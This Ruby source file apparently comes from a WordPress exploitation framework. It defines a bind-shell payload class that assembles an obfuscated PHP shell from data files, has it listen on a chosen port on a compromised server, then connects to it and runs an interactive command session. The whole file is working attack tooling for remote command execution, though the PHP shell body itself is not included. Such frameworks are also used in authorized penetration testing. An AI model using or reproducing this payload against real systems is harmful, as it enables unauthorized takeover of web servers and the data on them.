require 'socket'

module Wpxf::Payloads
  # A PHP shell bound to an IPv4 address.
  class BindPhp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options
    include Wpxf::Payloads::SocketHelper

    def initialize
      super

      register_options([
        PortOption.new(
          name: 'lport',
          required: true,
          default: 1234,
          desc: 'The port being used to listen for incoming connections'
        )
      ])
    end

    def check(mod)
      if mod.get_option('proxy')
        mod.emit_warning 'The proxy option for this module is only used for '\
                         'HTTP connections and will NOT be used for the TCP '\
                         'connection that the payload establishes'
      end
    end

    def lport
      normalized_option_value('lport')
    end

    def prepare(mod)
      self.host = mod.get_option_value('host')
    end

    def connect_to_host(event_emitter)
      event_emitter.emit_info "Connecting to #{host}:#{lport}..."
      socket = nil
      error = ''

      begin
        socket = TCPSocket.new(host, lport)
      rescue StandardError => e
        error = e
      end

      event_emitter.emit_error "Failed to connect to #{host}:#{lport} #{error}" unless socket
      socket
    end

    def post_exploit(mod)
      socket = connect_to_host(mod)
      return false unless socket

      Wpxf.change_stdout_sync(true) do
        mod.emit_success 'Established a session'
        puts
        start_socket_io_loop(socket, mod)
        socket.close
        puts
        mod.emit_info "Disconnected from #{host}:#{lport}"
      end

      true
    end

    def obfuscated_variables
      super +
        [
          'cmd', 'disabled', 'output', 'handle', 'pipes', 'fp',
          'port', 'scl', 'sock', 'ret', 'msg_sock', 'r', 'w', 'e'
        ]
    end

    def constants
      { 'port' => lport }
    end

    def raw
      "#{DataFile.new('php', 'exec_methods.php').php_content}"\
      "#{DataFile.new('php', 'bind_php.php').php_content}"
    end

    attr_accessor :host
  end
end
